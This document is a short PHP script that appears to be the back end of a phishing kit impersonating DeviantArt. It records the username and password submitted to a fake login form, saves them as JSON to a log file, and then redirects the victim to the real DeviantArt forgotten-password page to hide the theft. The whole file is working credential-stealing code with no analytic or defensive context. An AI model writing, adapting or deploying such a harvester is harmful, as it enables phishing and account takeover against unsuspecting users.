<?php

header('Location: https://www.deviantart.com/users/forgot/');
$data = array('site' => 'Deviantart',
  'user' => $_POST['username'],
  'pass' => $_POST['password']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>